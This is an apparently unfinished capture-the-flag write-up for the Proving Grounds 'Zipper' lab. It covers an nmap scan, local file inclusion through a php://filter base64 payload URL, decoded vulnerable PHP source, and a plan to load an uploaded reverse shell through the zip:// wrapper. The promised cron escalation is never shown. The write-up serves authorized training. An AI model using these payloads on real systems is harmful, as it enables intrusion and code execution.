@@ -1,0 +1,230 @@
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="description" content="This lab demonstrates chaining a file upload functionality with Local File Inclusion (LFI) to achieve Remote Code Execution (RCE). Learners escalate privileges by exploiting a cron job that uses the 7z utility with a wildcard *.zip parameter, allowing arbitrary file reading via symbolic link manipulation. This lab highlights chained web vulnerabilities, wildcard abuse, and cron job exploitation for root access."><title>Proving Grounds: Zipper</title><style>
+  :root { --muted:#9aa4b2; --accent:#facc15; --text:#e6eef6; --mono:ui-monospace,SFMono-Regular,Menlo,Monaco,"Roboto Mono","Courier New",monospace; --maxw:900px; }
+  * { box-sizing:border-box; } html { scroll-behavior:smooth; }
+  body { margin:0; background:linear-gradient(180deg,#071021 0%,#0f1724 50%); color:var(--text); font-family:Inter,"Segoe UI",Roboto,system-ui,-apple-system,sans-serif; -webkit-font-smoothing:antialiased; line-height:1.6; }
+  .wrap { max-width:var(--maxw); margin:40px auto; padding:28px; background:linear-gradient(180deg,rgba(255,255,255,.02),rgba(255,255,255,.01)); border:1px solid rgba(255,255,255,.03); border-radius:12px; box-shadow:0 6px 30px rgba(2,6,23,.6); }
+  .site-header { display:flex; align-items:center; justify-content:space-between; gap:16px; padding-bottom:18px; margin-bottom:24px; border-bottom:1px solid rgba(255,255,255,.06); }
+  .site-brand { color:var(--accent); font-weight:750; letter-spacing:.02em; text-decoration:none; } .site-brand:hover,.site-link:hover { color:#ffe57a; } .site-link { color:var(--muted); font-size:13px; text-decoration:none; } .back-button { padding:7px 11px; border:1px solid rgba(250,204,21,.24); border-radius:7px; background:rgba(250,204,21,.08); color:var(--accent); font-weight:650; }
+  .target-tag { display:inline-block; margin-bottom:12px; padding:5px 10px; border:1px solid rgba(250,204,21,.24); border-radius:999px; color:var(--accent); background:rgba(250,204,21,.1); font-size:12px; font-weight:700; letter-spacing:.08em; text-transform:uppercase; }
+  header h1 { margin:0; font-size:28px; letter-spacing:-.2px; line-height:1.25; } header p { margin:8px 0 0; color:var(--muted); font-size:14px; }
+  .meta { display:flex; flex-wrap:wrap; gap:12px; align-items:center; margin-top:18px; color:var(--muted); font-size:13px; } .badge { background:rgba(250,204,21,.12); color:var(--accent); padding:6px 10px; border-radius:999px; font-weight:600; font-size:13px; }
+  nav.toc { margin-top:22px; padding:14px; background:rgba(255,255,255,.02); border:1px solid rgba(255,255,255,.02); border-radius:8px; } nav.toc ul { display:flex; flex-wrap:wrap; gap:10px; margin:0; padding:0; list-style:none; } nav.toc a { color:var(--muted); text-decoration:none; font-size:13px; } nav.toc a:hover { color:var(--accent); }
+  article { margin-top:28px; } h2 { margin-top:30px; color:var(--accent); font-size:22px; scroll-margin-top:20px; } h3 { margin-top:22px; color:#dfe9f6; font-size:17px; } h4,h5,h6 { color:#dfe9f6; } p,li { overflow-wrap:anywhere; } a { color:var(--accent); } strong { color:#f4f8fc; }
+  blockquote { margin:16px 0; padding:10px 12px; color:var(--muted); background:rgba(250,204,21,.06); border-left:3px solid rgba(250,204,21,.22); border-radius:4px; }
+  .code-brief { margin:18px 0 8px; color:var(--muted); font-size:14px; }
+  pre { margin:12px 0; padding:14px; overflow:auto; color:#dff3ff; background:#041022; border:1px solid rgba(255,255,255,.03); border-radius:8px; box-shadow:0 6px 18px rgba(2,6,23,.5); font:13px/1.55 var(--mono); } code { padding:2px 6px; border-radius:4px; background:rgba(255,255,255,.04); font-family:var(--mono); font-size:.9em; } pre code { padding:0; background:transparent; font-size:inherit; }
+  table { width:100%; margin-top:12px; border-collapse:collapse; } th,td { padding:8px; border-bottom:1px solid rgba(255,255,255,.06); text-align:left; color:var(--muted); font-size:14px; } th { color:#dfe9f6; font-weight:600; } hr { border:0; border-top:1px solid rgba(255,255,255,.08); margin:28px 0; } img { max-width:100%; border-radius:8px; }
+  footer { margin-top:30px; padding-top:12px; border-top:1px solid rgba(255,255,255,.02); color:var(--muted); font-size:13px; text-align:center; }
+  @media (max-width:720px) { .wrap { margin:18px; padding:16px; } header h1 { font-size:20px; } nav.toc ul { flex-direction:column; gap:6px; } }
+</style></head><body><main class="wrap"><div class="site-header"><a class="site-brand" href="index.html">Karan Tank</a><a class="site-link back-button" href="index.html">← Back to index</a></div><header><span class="target-tag">Target: Linux</span><h1>Proving Grounds: Zipper</h1><p>This lab demonstrates chaining a file upload functionality with Local File Inclusion (LFI) to achieve Remote Code Execution (RCE). Learners escalate privileges by exploiting a cron job that uses the 7z utility with a wildcard *.zip parameter, allowing arbitrary file reading via symbolic link manipulation. This lab highlights chained web vulnerabilities, wildcard abuse, and cron job exploitation for root access.</p><div class="meta"><span class="badge">Proving Grounds</span><span>Authorized lab writeup</span><span>Cybersecurity portfolio</span></div></header><nav class="toc" aria-label="Table of contents"><ul><li><a href="#scenario">Scenario</a></li><li><a href="#learning-objectives">Learning objectives</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#initial-access">Initial Access</a></li><li><a href="#takeaways">Takeaways</a></li></ul></nav><article><blockquote>
+<p><strong>Authorized-lab note:</strong> This writeup documents activity performed exclusively in an authorized Offensive Security Proving Grounds lab. It is shared for educational and portfolio purposes.</p>
+</blockquote>
+<p>#Uncomplete
+A file upload capability and Local File Inclusion (LFI) will be chained to upload a malicious zip file and gain an initial foothold. Privileges will then be escalated by discovering a cron job that includes a *.zip wildcard, which is vulnerable to an arbitrary error that allows reading a file to obtain root access. This lab focuses on exploiting file upload vulnerabilities and privilege escalation methods.</p>
+<h2 id="scenario">Scenario</h2>
+<p>This lab demonstrates chaining a file upload functionality with Local File Inclusion (LFI) to achieve Remote Code Execution (RCE). Learners escalate privileges by exploiting a cron job that uses the 7z utility with a wildcard *.zip parameter, allowing arbitrary file reading via symbolic link manipulation. This lab highlights chained web vulnerabilities, wildcard abuse, and cron job exploitation for root access.</p>
+<h2 id="learning-objectives">Learning objectives</h2>
+<p><strong>After completion of this lab, learners will be able to:</strong></p>
+<ul>
+<li>Enumerate services to identify the file upload functionality and LFI vulnerability.</li>
+<li>Chain the file upload with LFI to achieve remote code execution.</li>
+<li>Deploy a reverse shell and gain initial access as the www-data user.</li>
+<li>Identify and analyze a root-level cron job that uses the 7z command with *.zip.</li>
+<li>Exploit the wildcard vulnerability to read sensitive files and escalate privileges to root.</li>
+</ul>
+<h2 id="enumeration">Enumeration</h2>
+<p class="code-brief">This block performs reconnaissance or local enumeration. Its output is reviewed for services, files, accounts, and other leads that guide the next step.</p><pre><code># This code block contains the helper code used for the documented lab step.
+
+&lt;?php
+$file = $_GET[&#39;file&#39;];
+if(isset($file))
+{
+    include(&quot;$file&quot;.&quot;.php&quot;);
+}
+else
+{
+include(&quot;home.php&quot;);
+}
+?&gt;</code></pre><ul>
+<li>It appends .php to the file as expected.</li>
+<li>Lets request the resource=home <code>http://192.168.170.229/index.php?file=php://filter/convert.base64-encode/resource=home</code> and decoding the base64 we get</li>
+</ul>
+<h2 id="initial-access">Initial Access</h2>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code>┌──(kali㉿kali)-[~/offsec/zipper]
+# Map exposed services and versions on the target.
+
+└─$ nmap -sCV -p-  192.168.170.229
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-20 15:19 -0400
+Nmap scan report for 192.168.170.229
+Host is up (0.021s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 c1:99:4b:95:22:25:ed:0f:85:20:d3:63:b4:48:bb:cf (RSA)
+|   256 0f:44:8b:ad:ad:95:b8:22:6a:f0:36:ac:19:d0:0e:f3 (ECDSA)
+|_  256 32:e1:2a:6c:cc:7c:e6:3e:23:f4:80:8d:33:ce:9b:3a (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-title: Zipper
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 32.13 seconds</code></pre><ul>
+<li><p>On Port 80, there is site that takes input as a file and gives us zip file to download</p>
+</li>
+<li><p>Looking at the source code, we find a zip file at <code>[uploads/upload_1781983382.zip](http://192.168.170.229/uploads/upload_1781983937.zip)</code></p>
+</li>
+<li><p>It was a dead end</p>
+</li>
+<li><p>We tried searching more and found that when you click on home button, a GET parameter appears. <code>http://192.168.170.229/index.php?file=home</code></p>
+</li>
+<li><p>Let’s try LFI. We can extract the source using the PHP base64 wrapper. It seems like it’s appending ‘.php’ to the file. <code>php://filter/convert.base64-encode/resource=index</code></p>
+</li>
+</ul>
+<p>Using the base64 decoder, we get</p>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># This code block contains the helper code used for the documented lab step.
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot; &gt;
+&lt;head&gt;
+  &lt;meta charset=&quot;UTF-8&quot;&gt;
+  &lt;title&gt;Zipper&lt;/title&gt;
+  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;, shrink-to-fit=no&quot;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;https://cdnjs.cloudflare.com/ajax/libs/normalize/5.0.0/normalize.min.css&quot;&gt;
+&lt;link rel=&#39;stylesheet&#39; href=&#39;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.2/css/bootstrap.min.css&#39;&gt;
+&lt;link rel=&#39;stylesheet&#39; href=&#39;https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css&#39;&gt;&lt;link rel=&quot;stylesheet&quot; href=&quot;./style.css&quot;&gt;
+&lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css&quot;&gt;
+
+&lt;/head&gt;
+&lt;body&gt;
+&lt;?php include &#39;upload.php&#39;; ?&gt;
+&lt;!-- partial:index.partial.html --&gt;
+&lt;nav class=&quot;navbar navbar-expand-md navbar-dark fixed-top bg-dark&quot;&gt;
+  &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;
+    &lt;i class=&quot;fa fa-codepen&quot; aria-hidden=&quot;true&quot;&gt;&lt;/i&gt;
+    Zipper
+  &lt;/a&gt;
+  &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExampleDefault&quot; aria-controls=&quot;navbarsExampleDefault&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+  &lt;/button&gt;
+
+  &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarsExampleDefault&quot;&gt;
+    &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt;
+      &lt;li class=&quot;nav-item active&quot;&gt;
+        &lt;a class=&quot;nav-link&quot; href=&quot;/index.php?file=home&quot;&gt;Home &lt;span class=&quot;sr-only&quot;&gt;(current)&lt;/span&gt;&lt;/a&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+    &lt;form class=&quot;form-inline my-2 my-lg-0&quot;&gt;
+      &lt;input class=&quot;form-control mr-sm-2&quot; type=&quot;text&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot;&gt;
+      &lt;button class=&quot;btn btn-outline-light my-2 my-sm-0&quot; type=&quot;submit&quot;&gt;Search&lt;/button&gt;
+    &lt;/form&gt;
+  &lt;/div&gt;
+&lt;/nav&gt;
+
+&lt;!-- Main jumbotron for a primary marketing message or call to action --&gt;
+&lt;div class=&quot;jumbotron&quot;&gt;
+  &lt;div class=&quot;container&quot;&gt;
+    &lt;h1 class=&quot;display-3&quot;&gt;Welcome to Zipper!&lt;/h1&gt;
+    &lt;p class=&quot;lead&quot;&gt;
+      With this online ZIP converter you can compress your files and create a ZIP archive. Reduce file size and save bandwidth with ZIP compression. 
+      Your uploaded files are encrypted and no one can access them.
+    &lt;/p&gt;
+    &lt;hr class=&quot;my-4&quot;&gt;
+    &lt;div class=&quot;page-container row-12&quot;&gt;
+    		&lt;h4 class=&quot;col-12 text-center mb-5&quot;&gt;Create Zip File of Multiple Uploaded Files &lt;/h4&gt;
+    		&lt;div class=&quot;row-8 form-container&quot;&gt;
+            &lt;?php 
+            if(!empty($error)) { 
+            ?&gt;
+    			&lt;p class=&quot;error text-center&quot;&gt;&lt;?php echo $error; ?&gt;&lt;/p&gt;
+            &lt;?php 
+            }
+            ?&gt;
+            &lt;?php 
+            if(!empty($success)) { 
+            ?&gt;
+    			&lt;p class=&quot;success text-center&quot;&gt;
+            Files uploaded successfully and compressed into a zip format
+            &lt;/p&gt;
+            &lt;p class=&quot;success text-center&quot;&gt;
+            &lt;a href=&quot;uploads/&lt;?php echo $success; ?&gt;&quot; target=&quot;__blank&quot;&gt;Click here to download the zip file&lt;/a&gt;
+            &lt;/p&gt;
+	    	    &lt;?php 
+            }
+            ?&gt;
+		    	&lt;form action=&quot;&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
+				    &lt;div class=&quot;input-group&quot;&gt;
+						&lt;div class=&quot;input-group-prepend&quot;&gt;
+						    &lt;input type=&quot;submit&quot; class=&quot;btn btn-primary&quot; value=&quot;Upload&quot;&gt;
+						&lt;/div&gt;
+						&lt;div class=&quot;custom-file&quot;&gt;
+						    &lt;input type=&quot;file&quot; class=&quot;custom-file-input&quot; name=&quot;img[]&quot; multiple&gt;
+						    &lt;label class=&quot;custom-file-label&quot; &gt;Choose File&lt;/label&gt;
+						&lt;/div&gt;
+					&lt;/div&gt;
+				&lt;/form&gt;
+				
+    		&lt;/div&gt;
+		&lt;/div&gt;
+  &lt;/div&gt;
+
+
+&lt;/div&gt;
+
+&lt;div class=&quot;container&quot;&gt;
+  &lt;footer&gt;
+    &lt;p&gt;&amp;copy; Zipper 2021&lt;/p&gt;
+  &lt;/footer&gt;
+&lt;/div&gt; &lt;!-- /.container --&gt;
+&lt;!-- partial --&gt;
+  &lt;script src=&#39;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.13.0/umd/popper.min.js&#39;&gt;&lt;/script&gt;
+&lt;script src=&#39;https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.0.0-beta.2/js/bootstrap.bundle.min.js&#39;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</code></pre><ul>
+<li>requesting <code>php://filter/convert.base64-encode/resource=upload</code></li>
+</ul>
+<p class="code-brief">This block uses the identified entry point to obtain or validate an initial foothold. The resulting response or session confirms whether access was achieved.</p><pre><code># This code block contains the helper code used for the documented lab step.
+
+&lt;?php
+if ($_FILES &amp;&amp; $_FILES[&#39;img&#39;]) {
+    
+    if (!empty($_FILES[&#39;img&#39;][&#39;name&#39;][0])) {
+        
+        $zip = new ZipArchive();
+        $zip_name = getcwd() . &quot;/uploads/upload_&quot; . time() . &quot;.zip&quot;;
+        
+        // Create a zip target
+        if ($zip-&gt;open($zip_name, ZipArchive::CREATE) !== TRUE) {
+            $error .= &quot;Sorry ZIP creation is not working currently.&lt;br/&gt;&quot;;
+        }
+        
+        $imageCount = count($_FILES[&#39;img&#39;][&#39;name&#39;]);
+        for($i=0;$i&lt;$imageCount;$i++) {
+        
+            if ($_FILES[&#39;img&#39;][&#39;tmp_name&#39;][$i] == &#39;&#39;) {
+                continue;
+            }
+            $newname = date(&#39;YmdHis&#39;, time()) . mt_rand() . &#39;.tmp&#39;;
+            
+            // Moving files to zip.
+            $zip-&gt;addFromString($_FILES[&#39;img&#39;][&#39;name&#39;][$i], file_get_contents($_FILES[&#39;img&#39;][&#39;tmp_name&#39;][$i]));
+            
+            // moving files to the target folder.
+            move_uploaded_file($_FILES[&#39;img&#39;][&#39;tmp_name&#39;][$i], &#39;./uploads/&#39; . $newname);
+        }
+        $zip-&gt;close();
+        
+        // Create HTML Link option to download zip
+        $success = basename($zip_name);
+    } else {
+        $error = &#39;&lt;strong&gt;Error!! &lt;/strong&gt; Please select a file.&#39;;
+    }
+}</code></pre><ul>
+<li>We know that our zip files is stored on the /uploads as well. </li>
+<li>There’s this zip:// PHP wrapper that will unzip and read our file automatically. </li>
+<li>Here’s an article for reference. <a href="https://rioasmara.com/2021/07/25/php-zip-wrapper-for-rce/?source=post_page-----b49a52ed8e38---------------------------------------">PHP ZIP:// wrapper for RCE</a></li>
+<li>Basically we just need to upload a reverse shell file and load it using the LFI and zip wrapper.</li>
+</ul>
+<h2 id="takeaways">Takeaways</h2>
+<p>This lab reinforced the value of methodical enumeration, evidence-driven hypothesis testing, and validating each access-control boundary in an authorized environment.</p>
+</article><footer>Written by Karan Tank · Documented for educational and portfolio purposes in an authorized lab environment.</footer></main></body></html>
